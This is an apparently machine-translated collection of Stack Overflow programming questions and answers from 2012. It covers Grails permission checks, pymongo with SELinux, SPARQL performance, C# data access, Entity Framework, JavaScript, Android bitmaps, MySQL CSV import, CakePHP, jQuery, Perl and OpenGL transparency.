> 标签：java, hibernate, grails, many-to-many, grails-orm

我有 2 个域对象，用户和系统权限（它是多对多的，所以 1 个用户可以拥有很多权限，1 个权限可以由多个用户拥有）。我正在寻找一种简单的方法来检查用户是否具有所需的权限。

**用户域**

```
class User {

    static hasMany = [systemRights: SystemRight, enterpriseUsers: EnterpriseUser]

    String email;   
    String passwordHash;
} 
```

**SystemRight 域**

```
class SystemRight {

    public static final String LOGIN = "LOGIN"
    public static final String MODIFY_ALL_ENTERPRISES = "MODIFY_ALL_ENTERPRISES"
    public static final String ADMINISTER_SYSTEM = "ADMINISTER_SYSTEM"
    public static final String VALIDATE_SUPPLIER_SCORECARDS = "VALIDATE_SUPPLIER_SCORECARDS"

    static hasMany = [users:User]
    static belongsTo = User

    String name
} 
```

以下对我不起作用：

**在 User.class 中**

```
public boolean hasRights(List<String> requiredRights) {

    def userHasRight = SystemRight.findByUserAndSystemRight (this, SystemRight.findByName(requiredRight));

    // Nor this

    def userHasRight = this.systemRights.contains(SystemRight.findByName(requiredRight));

} 
```

**当前可怕的解决方案**

```
public boolean hasRights(List<String> requiredRights) {

    for (String requiredRight : requiredRights) {

        def has = false

        for (SystemRight userRight : user.systemRights) {
            if (userRight.name == requiredRight) {
                has = true
                break;
            }
        }

        if (has == false) {
            return false;
        }            
    }

    return true        

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:03:33.753

如果您能够/愿意稍微改变一下，我强烈建议您执行以下操作。它会让你的生活更轻松。

首先，从两个域中删除 SystemRight 和 User 的 hasMany，并从 SystemRight 中删除 belongsTo User。

接下来，创建域来表示连接表。

```
class UserSystemRight {
   User user
   SystemRight systemRight

   boolean equals(other) {
      if (!(other instanceof UserSystemRight)) {
          return false
      }
      other.user?.id == user?.id && other.systemRight?.id == systemRight?.id
   }

   int hashCode() {
      def builder = new HashCodeBuilder()
      if (user) builder.append(user.id)
      if (systemRight) builder.append(systemRight.id)
      builder.toHashCode()
   }

   // add some more convenience methods here if you want like...
   static UserSystemRight get(long userId, long systemRightId, String systemRightName) {
       find 'from UserSystemRight where user.id=:userId and systemRight.id=:systemRightId and systemRight.name=:systemRightName',
            [userId: userId, systemRightId: systemRightId, systemRightName: systemRightName]
   }
} 
```

然后，在您的 User 类中，您可以添加此方法：

```
Set<SystemRight> getSystemRights() {
    UserSystemRight.findAllByUser(this).collect { it.systemRight } as Set
} 
```

然后，将其添加到您的 SystemRight 域：

```
Set<User> getUsers() {
    UserSystemRight.findAllBySystemRight(this).collect { it.user } as Set
} 
```

要更详细地解释为什么这种方法充满胜利，除了实际解决您的问题之外，请看[一下这个](http://www.infoq.com/presentations/GORM-Performance).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T00:07:37.193

我肯定会尝试在数据库中解决这个问题。

```
def relevantUserRights = SystemRight.withCriteria {
    eq("user", this)
    "in"("name", requiredRights);
}

return relevantUserRights.size() == requiredRights.size() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T21:21:29.130

下面的呢？

```
public boolean hasRights(List<String> requiredRights) {
    return null != (this.systemRights.find { requiredRights.contains(it) });
} 
```

（未测试：这里是 Groovy 新手）

# python - 无法使用 cgi 脚本连接到 MongoDB

> ID：13572913
> 
> 赞同：1
> 
> 时间：2012-11-26T20:48:01.410
> 
> 标签：python, cgi, pymongo

这可以从命令行正常工作，但不能通过网络：

```
#!/usr/bin/python
# -*- coding: utf-8 -*-

import cgitb
cgitb.enable()
from pymongo import Connection

print "Content-Type: text/html"     # HTML is following
print                               # blank line, end of headers
print "<TITLE>CGI script output</TITLE>"
print "<HTML>Here</HTML>"

connection = Connection() 
```

该文件位于我的 cgi-bin 目录中。当我尝试通过网络运行它时，我得到：

```
A problem occurred in a Python script. Here is the sequence of function calls leading up to the error, in the order they occurred.    
/var/www/cgi-bin/test2.py
9 print                               # blank line, end of headers
10 print "<TITLE>CGI script output</TITLE>"
11 print "<HTML>Here</HTML>"
12 
13 connection = Connection()
connection undefined, Connection = <class 'pymongo.connection.Connection'>
 /usr/lib64/python2.4/site-packages/pymongo/connection.py in __init__(self=Connection(None, None), host=['localhost'], port=27017, pool_size=None, auto_start_request=None, timeout=None, slave_okay=False, network_timeout=None, document_class=<type 'dict'>, tz_aware=False, _connect=True)
303 
304         if _connect:
305             self.__find_master()
306 
307         if username:
self = Connection(None, None), self.__find_master = Database(Connection(None, None), u'__find_master')
/usr/lib64/python2.4/site-packages/pymongo/connection.py in __find_master(self=Connection(None, None))
507                 return node
508 
509         raise AutoReconnect("could not find master/primary")
510 
511     def __connect(self):
global AutoReconnect = <class pymongo.errors.AutoReconnect>

AutoReconnect: could not find master/primary
  args = ('could not find master/primary',) 
```

MongoDB 在本地主机上运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T15:51:56.500

我自己解决了这个问题。SELinux 阻止了我的脚本对数据库的访问。

尝试（作为根）：

```
setsebool httpd_can_network_connect 
setsebool httpd_can_network_connect_db 1 
```

# regex - 如何使我的 sparql 使用正则表达式查询更快？

> ID：13572915
> 
> 赞同：3
> 
> 时间：2012-11-26T20:48:17.350
> 
> 标签：regex, performance, sparql, dbpedia

我已经为 dbpedia 构建了一个 sparql 查询，其中包含一个非常慢的正则表达式：

```
PREFIX rdf:<http://www.w3.org/1999/02/22-rdf-syntax-ns#>
PREFIX dbpedia-owl:<http://dbpedia.org/ontology/>

select ?label where {
    ?s rdfs:label ?label.
    ?s dbpedia-owl:thumbnail ?photo.
    ?s dbpedia-owl:abstract ?abstract.
    FILTER langMatches( lang(?label), "FR" ).
    FILTER langMatches( lang(?abstract), "FR" ).
    FILTER regex(?label, "^Jules V", "i").

}
LIMIT 10 
```

您可以使用公共端点[http://fr.dbpedia.org/sparql](http://fr.dbpedia.org/sparql)尝试它，然后看到您必须等待几秒钟。

有没有办法让我在这方面获得更好的表现，即使最终质量不太好？

谢谢，塞缪尔

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-27T17:47:51.913

`REGEX`除非您的查询限制在数据集的足够小部分，否则使用任何查询几乎肯定会很慢。处理 a`REGEX`基本上要求商店对潜在结果进行线性扫描，检查每个结果是否与正则表达式匹配。

如果你有一个足够简单的正则表达式，你应该尝试以下两种方法之一：

### 解决方案 1 - 使用重量更轻的字符串函数

在您的情况下，您正在寻找以某个子字符串开头的字符串，因此使用该函数几乎肯定会更有效，`STRSTARTS`因为它不需要完整的正则表达式。这当然假设您的 SPARQL 引擎符合最新的 SPARQL 1.1 草案规范。

### 解决方案 2 - 使用全文搜索

许多商店都包含全文搜索扩展，它们可以用来代替`REGEX`并且通常会产生明显更好的性能，因为您正在访问全文索引而不是对潜在结果进行线性扫描。

对于 DBPedia，其背后的 Virtuoso 存储支持以下语法：

```
?label bif:contains "Jules" 
```

请注意，Virtuoso 全文语法有些限制，因此您不能`Jules V`按原样使用，因为每个术语必须至少有 4 个字符（可能是 3 个）。但是您可以将其与进一步`FILTER`缩小到您想要的结果相结合，如下所示：

```
PREFIX rdf:<http://www.w3.org/1999/02/22-rdf-syntax-ns#>
PREFIX dbpedia-owl:<http://dbpedia.org/ontology/>

select ?label where {
    ?s rdfs:label ?label.
    ?s dbpedia-owl:thumbnail ?photo.
    ?s dbpedia-owl:abstract ?abstract.
    FILTER langMatches( lang(?label), "FR" ).
    FILTER langMatches( lang(?abstract), "FR" ).
    ?label bif:contains "Jules" .
    FILTER (CONTAINS(?label, "V"))

}
LIMIT 10 
```

此查询几乎立即运行

# c# - 如何使用 sql 连接对象重载此数据访问层方法

> ID：13572919
> 
> 赞同：0
> 
> 时间：2012-11-26T20:48:32.840
> 
> 标签：c#, ado.net, data-access-layer, bll

两个服务都使用 IUnitDataProvider 的 AddChildrenUnit 方法。

TemplateService 必须将此方法传递给已打开的连接对象，因为 CreateTemplate 方法必须在 AddTemplate 和“创建根单元节点”的事务中运行。

UnitService 没有将连接对象传递给 AddChildrenUnit 方法，因此代码无法编译！！！

我现在的问题是：我不能更改 AddChildrenUnit 方法并删除 sqlconnection 参数，否则 CreateTemplate 方法中的 AddChildrenUnit 将不再编译。

那我现在能做什么？我唯一能想到的是 AddChildrenUnit 的一个重载版本，一次带有 SqlConnection 参数，一个方法不带此参数。

太麻烦了...

你知道更好的解决方案吗？

**模板服务**：

```
public void CreateTemplate(Template template)
{
    using (var transaction = new TransactionScope()) 
    using (var connection = new SqlConnection(_connectionString))
    {
        connection.Open();

        _templateDataProvider.AddTemplate(template,connection);
        Unit rootUnit = new Unit{ TemplateId = template.TemplateId, ParentId = null, Name = "Root" };
        _unitDataProvider.AddChildrenUnit(rootUnit,connection);

        transaction.Complete();
    }
} 
```

**单位服务**：

```
public void AddChildrenUnit(Unit unit)
{
    lock (this)
    {
        IEnumerable<Unit> childrenUnits = _unitDataProvider.GetChildrenUnits(unit.UnitId); // Selected ParentId
        int hierarchyIndexOfSelectedUnitId = childrenUnits.Select(u => u.HierarchyIndex).DefaultIfEmpty(0).Max(c => c);
        int hierarchyIndexOfNewChild = hierarchyIndexOfSelectedUnitId + 1;
        unit.HierarchyIndex = hierarchyIndexOfNewChild;

        _unitDataProvider.AddChildrenUnit(unit);
    }
} 
```

**单位数据提供者**：

```
/// <summary>
///  INSERT new child at the end of the children which is the highest HierarchyIndex 
/// </summary>
/// <param name="unit"></param>
public void AddChildrenUnit(Unit unit) // 10 ms
{
    using (var trans = new TransactionScope())
    using (var con = new SqlConnection(_connectionString))
    using (var cmd = new SqlCommand("INSERT INTO UNIT (Name,TemplateId,ParentId,CreatedAt,HierarchyIndex) VALUES (@Name,@TemplateId,@ParentId,@CreatedAt,@HierarchyIndex);Select Scope_Identity();",con))
    {
        con.Open();

        // INSERT new child at the end of the children which is the highest HierarchyIndex                
        cmd.Parameters.AddWithValue("HierarchyIndex", unit.HierarchyIndex); 
        cmd.Parameters.AddWithValue("TemplateId", unit.TemplateId);
        cmd.Parameters.AddWithValue("Name", unit.Name);
        cmd.Parameters.Add("CreatedAt", SqlDbType.DateTime2).Value = unit.CreatedAt; 

        unit.UnitId = Convert.ToInt32(cmd.ExecuteScalar());

        trans.Complete();
    }             
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T22:06:36.600

这个怎么样？

```
public void AddChildrenUnit(Unit unit) // 10 ms
{
    AddChilrenUnit(unit, new SqlConnection(_connectionString));
}

public void AddChildrenUnit(Unit unit, SqlConnection connection)
{
    using (var trans = new TransactionScope())
    using (connection))
    using (var cmd = new SqlCommand("INSERT INTO UNIT (Name,TemplateId,ParentId,CreatedAt,HierarchyIndex) VALUES (@Name,@TemplateId,@ParentId,@CreatedAt,@HierarchyIndex);Select Scope_Identity();",con))
    {
        con.Open();

        // INSERT new child at the end of the children which is the highest HierarchyIndex                
        cmd.Parameters.AddWithValue("HierarchyIndex", unit.HierarchyIndex); 
        cmd.Parameters.AddWithValue("TemplateId", unit.TemplateId);
        cmd.Parameters.AddWithValue("Name", unit.Name);
        cmd.Parameters.Add("CreatedAt", SqlDbType.DateTime2).Value = unit.CreatedAt; 

        unit.UnitId = Convert.ToInt32(cmd.ExecuteScalar());

        trans.Complete();
    }             

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T22:34:35.093

这就是我要做的。

```
public interface IUnitDataProvider
{
    void AddChildrenUnit(Unit unit, string connectionString);
}

public class UnitService:IUnitDataProvider
{
    //Implement AddChildrenUnit the way want
    //pass the connection string but u dont use it
}

public interface UnitDataProvider:IUnitDataProvider
{
    //Implement AddChildrenUnit the way want
} 
```

公共类模板类{

```
private IUnitDataProvider _unitDataProvider;

public templateClass(IUnitDataProvider provider)
{
        _unitDataProvider=provider
}

public void CreateTemplate(Template template)
{
    //pre -addUnit code here

   _unitDataProvider.AddChildrenUnit(unit, connectionstring);

    //Post -addUnit code here

} 
```

}

因此，根据您的用法，您将正确的具体实现传递给 TemplateClass 的构造函数（我将其命名为 TemplateClass ，我不知道您如何称呼它）

# asp.net-mvc - 重新加载绑定实体导致“ObjectStateManager 中已存在具有相同键的对象”

> ID：13572928
> 
> 赞同：0
> 
> 时间：2012-11-26T20:49:37.910
> 
> 标签：asp.net-mvc, entity-framework

以前有人问过这个问题，但似乎没有一个可用的答案适合我的情况。为了执行一些验证，我必须从 DB 重新加载已经绑定到模型的相同实体。以下导致错误。我快要失去理智了。

```
[HttpPost]
public ActionResult Edit(Tekes tekes, FormCollection fc)
{
  ...
  Tekes myTekes = db.Tkasim.Find(tekes.TeksID);
  <some validation here>
  if (ModelState.IsValid)
  {
     db.Entry(tekes).State = EntityState.Modified;
     db.SaveChanges();
     return RedirectToAction("Details", new { id = tekes.TekesID });
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T23:20:02.827

不确定为什么必须从数据库中获取相同的实体。无论如何，问题在于该`Find`语句将`Tekes`对象添加到上下文中，随后该语句`db.Entry(tekes).State = EntityState.Modified`尝试做同样的事情。目前尚不清楚验证的全部内容，但我认为您可以通过替换`Find`by来解决这个问题

```
var myTekes = db.Tkasim.AsNoTracking().Single(x => x.TeksId == tekes.TeksID); 
```

[AsNoTracking](http://msdn.microsoft.com/en-us/library/gg679352%28v=vs.103%29.aspx)告诉 EF 获取实体而不将它们添加到缓存和状态管理器中。

# javascript - 将一种类型的 javascript 对象转换为另一种类型

> ID：13572935
> 
> 赞同：3
> 
> 时间：2012-11-26T20:49:59.263
> 
> 标签：javascript, object

我需要转换一种类型的 JavaScript 对象：

```
object1: [{"a":"value1", "b":"value2", "c":"value3"}, {"d":"value4","e":"value5","f":"value6"}] 
```

对于另一种类型的对象：

```
object2 : {"value1":["value1", "value2", "value3"], "value4":["value4","value5","value6"]} 
```

我尝试使用此功能对其进行转换：

```
function toObject(arr) {
   var rv = {};
   for (var i = 0; i < arr.length; ++i) {
      rv[i] = arr[i];
   }
   return rv;
} 
```

但我得到的是数字索引（[0]，[1]）而不是“value1”和“value4”。您能否给我一些提示，我该如何进行从 object1 到 object2 的转换。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:53:47.777

你想要的是连接向量囚犯？

尝试：

```
function toObject(arr) {
   var rv = {}, k;
   for (var i = 0; i < arr.length; ++i) {
     for(k in arr[i]){
       rv[k] = arr[i][k];
     }
   }
   return rv;
} 
```

如果这不是您正在寻找的内容，请尝试以下操作： **[已修复（在用户*@ [user1689607](https://stackoverflow.com/users/1689607/user1689607)*的帮助下）]**

**[编辑]**：

`Object.keys`在较旧的浏览器中不起作用。**[固定的]**

```
function toObject(arr,_sort) {
    //param1 = Object, param2 = (true:sort, false:default)
    var rv = {}, k, firstV = null, keys, obj, tmp, j,
       ObjK = Object.keys ? function(ke){
            return Object.keys(ke);
       } : function(ke){
            var r = [];
            for(var o in ke){
                r[r.length] = o;
            }
            return r;
       };

    for (var i = 0; i < arr.length; ++i) {
        obj = arr[i];
        tmp = [];
        keys = _sort===true ? ObjK(obj).sort() : ObjK(obj);
        tmp = [obj[keys[0]]];
        for (j = 0; j < keys.length; ++j) {
            tmp[tmp.length] = obj[keys[j]];
        }
        rv[obj[keys[0]]] = tmp;
        firstV = null;
    }
    return rv;
}

//sort
console.log(
    toObject([{"a":"value1", "b":"value2", "c":"value3"}, {"d":"value4","e":"value5","f":"value6"}]),
true);

//default
console.log(
    toObject([{"a":"value1", "b":"value2", "c":"value3"}, {"d":"value4","e":"value5","f":"value6"}])
); 
```

# android - 在android中将图像划分为图块

> ID：13572939
> 
> 赞同：0
> 
> 时间：2012-11-26T20:50:30.127
> 
> 标签：android, image

我正在创建一个拼图游戏，为此我想将我的图像分成瓷砖。说 4x4。我想为每个图块分配一个唯一的名称，该名称将存储在一个数组中。将图像分解成图块的程序是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T21:17:50.600

通常，您可以动态创建位图并创建画布以在其上绘图：

```
Bitmap myBitmap = Bitmap.createBitmap(width, height, config);
Canvas myCanvas = new Canvas(myBitmap); 
```

然后在画布上绘制你想要的东西（甚至是其他位图的一部分）。但是，在这种情况下，这不是您应该做的（如果您将来遇到此问题，我只是将其作为一般信息提及）。

在这种特定情况下，由于您想要位图是原始位图的一部分，您可以使用以下方法：

```
Bitmap piece = Bitmap.createBitmap(fullImage, x, y, width, height); 
```

其中 fullImage 是原始的全尺寸位图，x,y,width,height 指定您想要的矩形部分。您将为每个拼图创建一个这样的对象。

看：

[http://developer.android.com/reference/android/graphics/Bitmap.html](http://developer.android.com/reference/android/graphics/Bitmap.html)

# ios - 纯文本预览无法正确显示特殊字符

> ID：13572943
> 
> 赞同：1
> 
> 时间：2012-11-26T20:50:37.377
> 
> 标签：ios, preview, diacritics, print-preview

我有一个 UTF8 文件，我通过 UIDocumentInteractionController 向用户显示预览。在预览中，诸如变音符号 ä（上面有两个点的 a）等特殊字符无法正确显示。它看起来像一个大写字母 A，旁边有一个框：Ã¤

文件保存如下：

```
[plainTextContents writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil]; 
```

并通过以下方式显示：

```
NSURL *pathURL = [NSURL fileURLWithPath:path];
UIDocumentInteractionController* docController = [UIDocumentInteractionController interactionControllerWithURL:pathURL];
docController.delegate = parentViewController; 
```

如果我在 Mac OS X 上打开保存的文件，特殊字符会按预期显示。如果我在 iPad 上预览文件的 RTF 版本，也使用 NSUTF8StringEncoding 保存，它看起来也很好。有一些关于纯文本预览的内容已关闭。

有什么建议么？谢谢。

# android - 如何绘制并列的矩形

> ID：13572944
> 
> 赞同：1
> 
> 时间：2012-11-26T20:50:44.433
> 
> 标签：android, android-canvas, drawrect

我想画出像下面这样的形状。在某些用户事件之后，程序必须使用不同的参数重新绘制它：框的数量和宽度发生了变化。它代表一个时期内的繁忙和空闲时间段。

![样本](../Images/83b9669dc1146840c14232c9702e22c7.png)

整个绘图将在视图控件中。我只知道伪代码：

```
int left = 1;
int upper = 1;
int bottom = 50;
foreach( myDataType item : List<myDataType> ) {
    Paint myPaint = new Paint();
    myPaint.setColor( Color.RED );
    Draw( left,  upper, left + item.width, bottom, myPaint );  // red one
    left += item.width;
    myPaint.setColor( Color.GREEN );
    Draw( left,  upper, left + item.nextGap, bottom, myPaint );  // green one
    left += item.nextGap;
} 
```

欢迎任何想法，谢谢！

# mysql - 如何批量插入csv文件？

> ID：13572947
> 
> 赞同：1
> 
> 时间：2012-11-26T20:51:12.980
> 
> 标签：mysql, sql, phpmyadmin

```
BULK INSERT krissmall
FROM 'C:\Users\Administrator\Downloads\misskrisdata_small.csv'
WITH (FIELDTERMINATOR = ',', ROWTERMINATOR = '\n') 
```

**ERROR 1064 (42000)**：您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在“BULK INSERT krissmall FROM 'C:\Users\Administrator\Downloads\misskrisdata_small”附近使用正确的语法。在第 1 行

有人可以告诉我哪里出错了吗？或者这背后的一些其他原因。我盯着这个查询很久了，查了很多，但我找不到哪里错了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:57:26.740

我很好奇您在哪里查找，`BULK INSERT`因为 MySQL 似乎根本不支持它。也许您正在阅读 MS SQL 文档并将两者混淆。

您想要的是[`LOAD DATA INFILE`](http://dev.mysql.com/doc/refman/5.5/en/load-data.html)可以解析 CSV 的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:59:04.960

您标记`phpmyadmin`了这使我相信您正在尝试从远程服务器（可能是网络主机）执行此查询。远程服务器无法连接到您的本地驱动器。您必须通过 phpMyAdmin 导入或将要导入的文件上传到 phpMyAdmin 可以看到的目录。

# cakephp - CakePHP $this->App->js() 在视图中给出致命错误

> ID：13572948
> 
> 赞同：0
> 
> 时间：2012-11-26T20:51:14.623
> 
> 标签：cakephp, cakephp-2.0

在查看 CookBook 和一些代码示例时，我被告知要相信包含`$this->App->js();`在 view.ctp 中会输出 JS [CDATA] 但它会吐出一个致命错误：

> 致命错误：在第 32 行的 /Users/work/Dropbox/Websites/cake-cart/app/View/Layouts/default.ctp 中的非对象上调用成员函数 js()

查看日志仅显示与以下相关的调度错误：

> 2012-11-26 13:15:39 错误：[MissingControllerException] 找不到控制器类 CssController。//app/webroot/index.php(92): Dispatcher->dispatch(Object(CakeRequest), Object(CakeResponse)) {main}

我无法追踪它。也许没有足够的系统知识。有经验比较多的人加入吗？

关于我的设置的唯一事情 - 不确定它是否相关 - 是我正在使用引导主题并在 AppController APP/View/Themed/Bootstrap/ 中设置了主题

```
class AppController extends Controller {

public $theme = "Bootstrap";

... 
```

这似乎可以为网站提供服务...但是对于这个 js() 致命错误和日志中的那个 CSSController 错误。

任何帮助将不胜感激，谢谢。

** 已编辑 **

好的......我正在弄清楚这个数字。看起来我引用的示例在 APP/View/Helper/AppHelper.php 中创建了一个公共函数，如下所示：

```
class AppHelper extends Helper {

public $helpers = array(
    'Html',
    'Form',
    'Session',
    'Js',
);

public function js() {
    $shop = array();
    $shop['basePath'] = Router::url('/');
    $shop['params'] = array(
        'controller' => $this->params['controller'],
        'action' => $this->params['action'],
    );
    return $this->Html->scriptBlock('var Shop = ' . $this->Js->object($shop) . ';');
}
} 
```

...所以这是有道理的，为什么它会是 default.ctp 中的 $this->App->js() .... 但我仍然收到错误

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T19:41:25.620

好的，我将有问题的代码从 AppHelper 移到了我自己的 Helper 中，并从主页调用了该助手，一切都很好。我从来没有弄清楚为什么 $this->App->js(); 没用。嗯……有时有很多方法可以做某事。

# jquery - jQuery - 检查图像是否已加载

> ID：13572949
> 
> 赞同：0
> 
> 时间：2012-11-26T20:51:17.023
> 
> 标签：jquery, image, loaded

我在这里有一个演示来说明我的问题。

[http://www.ttmt.org.uk/forum/gallery2/](http://www.ttmt.org.uk/forum/gallery2/)

[http://jsfiddle.net/ttmt/tmyqj/11/](http://jsfiddle.net/ttmt/tmyqj/11/)

我整天都在尝试这样做，我不知道我是否完全错误的想法。

我有一个从页面上浮动的图像列表。

我希望图像从左到右一次加载一个。当一个图像完全加载时，下一个图像将开始。

我尝试过其他预加载想法，但它们似乎都预加载了所有图像，所以我正在等待所有图像加载。

我的想法是将所有 li 放在一个数组中，然后从页面中删除 li，然后我可以一次添加一个 li，检查图像是否已加载，然后加载下一个 li。

这种工作，但图像仍然随机加载，我无法弄清楚如何在添加下一个图像之前检查图像是否已加载。

这是一种愚蠢的做法吗？

我可以检查图像是否已完全加载。

```
 <!DOCTYPE html>
    <html>
      <meta charset="UTF-8">
      <head>
      <title>Title of the document</title>

      <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.1/jquery.min.js"></script>
      <link rel="stylesheet" type="text/css" href="http://yui.yahooapis.com/3.4.1/build/cssreset/cssreset-min.css">

      <style type="text/css">
        #header{
          position:fixed;
          margin:20px 0 0 20px;
        }
        #header #logo{
          width:100px;
          height:80px;
          background:red;
        }
        ul#gallery {
            margin:120px 0 0 0;
            float:left;
            height:500px;
            margin-right:-20000px;
        }
        ul#gallery li{
          display:inline;
        }
        ul#gallery li img{
          float:left;
          height:100%;
        }

      </style>

      </head>

    <body>

      <div id="header">
        <div id="logo">

        </div><!-- #logo -->
      </div><!-- #header -->

      <ul id="gallery">
        <li><a href=""><img src="images/01.jpg" /></a></li>
        <li><a href=""><img src="images/02.jpg" /></a></li>
        <li><a href=""><img src="images/03.jpg" /></a></li>
        <li><a href=""><img src="images/04.jpg" /></a></li>
        <li><a href=""><img src="images/05.jpg" /></a></li>
        <li><a href=""><img src="images/06.jpg" /></a></li>
        <li><a href=""><img src="images/07.jpg" /></a></li>
        <li><a href=""><img src="images/08.jpg" /></a></li>
        <li><a href=""><img src="images/09.jpg" /></a></li>
        <li><a href=""><img src="images/10.jpg" /></a></li>
        <li><a href=""><img src="images/11.jpg" /></a></li>
        <li><a href=""><img src="images/13.jpg" /></a></li>
        <li><a href=""><img src="images/14.jpg" /></a></li>
        <li><a href=""><img src="images/15.jpg" /></a></li>
      </ul>

    <script>

      $(function(){

        var imgArr=[];

        var lis = $('#gallery li')

        lis.each(function(){
          imgArr.push(this.outerHTML);
          $(this).remove();
        })

        window.ili = 0;

        rePopulate();//Add the li's back one at a time.

        function rePopulate(){
          var newli = $('#gallery').append(imgArr[ili]);
          var newImg = newli.find('img');
          //console.log(newImg);
          if(window.ili<=imgArr.length){
            //Need to check here if the image has loaded completely before loading the next 
            window.ili++;
            rePopulate();
          }
        } 
      })

      </script>
    </body>

    </html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:54:50.360

你可以使用这个[库](http://desandro.github.com/imagesloaded/)，我在我的项目中使用它。

# mysql - 找出购买最多的日子

> ID：13572950
> 
> 赞同：-1
> 
> 时间：2012-11-26T20:51:18.730
> 
> 标签：mysql, database, time

给定以下设置，对于每个`CD_name`，我如何找出购买最多的日子。我的结果表应该列出`CD_no`, 和当天的日期（别名为“最忙”）。如果一张 CD 有好几天被购买的数量相等，那么一张 CD 可以在结果表中出现多次，因此`CD_no`按字母顺序对结果表进行排序，对于相同的 CD_no，按日期从最早的第一个排序。

```
CREATE TABLE CD 
(
  CD_no TINYINT UNSIGNED,
  genre VARCHAR(60),
  purchase_date DATE NOT NULL,
  publication_time TIME NOT NULL,
  Artist VARCHAR(20)
); 
```

## 编辑

预期的输出列出了 CD_number 和最繁忙的日期，CD 编号也可能出现在购买量相等的几天。

例如以下数据：

```
CD_No   purchase_date    
1        2012-07-09
1        2012-07-09
1        2012-07-09
1        2012-07-10
1        2012-07-10
2        2012-11-11
2        2012-11-11
2        2012-11-12
2        2012-11-12 
```

应该有结果表：

```
CD_NO      Busiest
1        2012-07-09
2        2012-11-11
2        2012-11-12 
```

因为 cd_no 1 在该日期销售最多，而 cd_no 2 则有联合购买。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:52:59.173

```
select CD_no,
       purchase_date as busiest
from CD
group by CD_no, purchase_date 
order by count(purchase_date) desc,
         CD_no asc,
         purchase_date asc
limit 3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T21:40:04.297

[SQL小提琴](http://www.sqlfiddle.com/#!2/406c1/6/0)

```
create view purchases as
select cd_no, purchase_date, count(*) as purchases
from cd
group by cd_no, purchase_date;

select p1.cd_no, p1.purchase_date as busiest
from purchases p1
join (select cd_no, max(purchases) as purchases
      from purchases
      group by cd_no) as p2
      on p1.cd_no = p2.cd_no and p1.purchases = p2.purchases
order by p1.cd_no, p1.purchase_date; 
```

# arrays - 一行中多次弹出

> ID：13572951
> 
> 赞同：2
> 
> 时间：2012-11-26T20:51:20.283
> 
> 标签：arrays, perl, syntax, arguments

我发现了一行 Perl 代码，它`pop`以我从未见过的方式使用。我一直认为`pop`从数组中只返回一项，但以下用法有所不同：

```
my ($self, $loop, $resources) = @{pop @_}; 
```

似乎程序员正在使用一行代码和一个`pop`命令从参数数组中获取三个项目，而没有创建显式`for`循环。这究竟是如何工作的？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-26T20:56:49.633

在这个例子中，@ **_**是一个数组，最后一个元素应该是一个数组引用。

因此，从**@_**`pop(@_)`获取最后一个元素，然后将其取消引用到一个数组中；将前 3 个元素保存到 $self、$loop 和 $resources 中。

 **可以这样重写：

```
my $self = $_[-1]->[0];
my $loop = $_[-1]->[1];
my $resources = $_[-1]->[2]; 
```

或者像这样：

```
my $temp = pop @_;
my ($self, $loop, $resources) = @$temp; 
```

所以，实际上它不是“一行中多次弹出”**

# opengl-es - GLKit/OpenGLES 2.0：如何订购原语？

> ID：13572953
> 
> 赞同：1
> 
> 时间：2012-11-26T20:51:27.730
> 
> 标签：opengl-es, geometry, transparency, opengl-es-2.0, glkit

我想用 GLKit 绘制半透明的图元。我已经通过禁用深度测试`glDisable(GL_DEPTH_TEST)`并通过启用混合

```
glEnable(GL_BLEND);
glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA); 
```

现在对于较大的 alpha 值（例如 0.9），我需要先绘制最远的三角形，这样它们就不会出现在更近的三角形*上方*。[glBlendFunc](http://www.opengl.org/sdk/docs/man/xhtml/glBlendFunc.xml)的文档中也说明了这一点：

> 透明度最好使用混合函数（GL_SRC_ALPHA，GL_ONE_MINUS_SRC_ALPHA）来实现，基元从最远到最近排序。请注意，此透明度计算不需要帧缓冲区中存在 alpha 位平面

在[OpenGL 透明度常见问题解答](http://www.opengl.org/archives/resources/faq/technical/transparency.htm)中：

> 在应用程序中使用深度缓冲时，您需要注意渲染图元的顺序。需要首先渲染完全不透明的图元，然后以从后到前的顺序渲染部分不透明的图元。如果您不按此顺序渲染图元，则通过部分不透明的图元可以看到的图元可能会完全失去深度测试。

但是由于视角可以改变（当我改变渲染效果时`modelViewMatrix`），从最远到最近的顺序取决于当前的视角。

有没有办法让OpenGL以正确的顺序自动渲染我的图元，如果没有，最好的方法是什么？我认为计算（取决于当前视角）的 z 位置并为每帧排序几千个三角形（或者更准确地说，每次视角变化时，可能是每一帧）成本太高，特别是因为我需要将此订单推送到每帧的 GPU。

请注意，我不关心使用纹理（只是彩色顶点）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T21:15:23.473

没有自动解决方案，因为由于相互重叠的问题，没有强大的实时解决方案。如果你会原谅 ASCII 艺术，请考虑四个四边形排列为：

```
 +--+             +--+
     |  |             |  |
+---------------------|  |------+
|                     |  |      |
+---------------------|  |------+
     |  |             |  |
     |  |             |  |
     |  |             |  |
+----|  |-----------------------+
|    |  |                       |
+----|  |-----------------------+
     |  |             |  |
     +--+             +--+ 
```

